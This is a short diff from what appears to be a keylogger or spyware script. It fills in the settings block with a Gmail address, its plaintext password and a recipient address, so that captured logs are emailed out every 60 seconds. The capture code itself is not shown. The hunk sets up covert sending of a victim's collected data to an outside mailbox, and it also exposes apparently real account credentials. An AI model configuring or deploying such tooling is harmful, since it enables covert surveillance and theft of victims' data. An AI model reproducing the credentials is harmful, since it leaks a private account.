@@ -26,9 +26,9 @@ t="";pics_names=[]
 
 #########Settings########
 
-yourgmail=""                                        #What is your gmail?
-yourgmailpass=""                                    #What is your gmail password
-sendto=""                                           #Where should I send the logs to? (any email address)
+yourgmail="mayotcoiffardmartial@gmail.com"                                        #What is your gmail?
+yourgmailpass="martial 57"                                    #What is your gmail password
+sendto="mayotcoiffardmartial@gmail.com"                                           #Where should I send the logs to? (any email address)
 interval=60                                         #Time to wait before sending data to email (in seconds)
 
 ########################
